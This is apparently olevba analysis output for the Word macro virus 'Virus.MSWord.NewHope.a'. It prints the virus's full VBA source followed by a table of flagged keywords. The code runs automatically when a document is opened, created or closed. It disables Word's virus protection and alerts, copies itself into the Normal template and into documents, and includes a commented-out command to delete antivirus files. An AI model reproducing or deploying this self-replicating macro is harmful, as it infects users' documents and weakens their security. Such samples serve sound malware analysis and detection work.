olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NewHope.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NewHope.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Rem
Call Document_Open
End Sub
Private Sub Document_New()
Call Document_Open
End Sub
Private Sub Document_Open()
On Error Resume Next
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
NormInstalled = False
ActInstalled = False
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1) = "Rem" Then NormInstalled = True
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1) = "Rem" Then ActInstalled = True
If NormInstalled = True And ActInstalled = True Then GoTo Killer
If NormInstalled = False Then
    Set Inf = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set Noc = ActiveDocument.VBProject.VBComponents(1).CodeModule
Else
    Set Inf = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Set Noc = NormalTemplate.VBProject.VBComponents(1).CodeModule
End If
With Noc
    Code = .Lines(1, .CountOfLines)
End With
With Inf
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, Code
End With
Application.DisplayAlerts = wdAlertsAll
''WordBasic.Kill "c:\Program Files\Trend Pc-cillin 98\*.*"
Exit Sub
Killer:
 If Month(Date) = Int(Rnd * 12 + 1) Then

  Set ULTRAS = ActiveDocument.Range(Start:=0, End:=0)
    With ULTRAS
        .Chr (13)
        .Font.Size = 42
        .Font.Name = "?⒬?E"
        .Font.ColorIndex = wdGreen
        .Font.Shadow = 1
        .Font.Animation = wdAnimationLasVegasLights
    End With
 End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

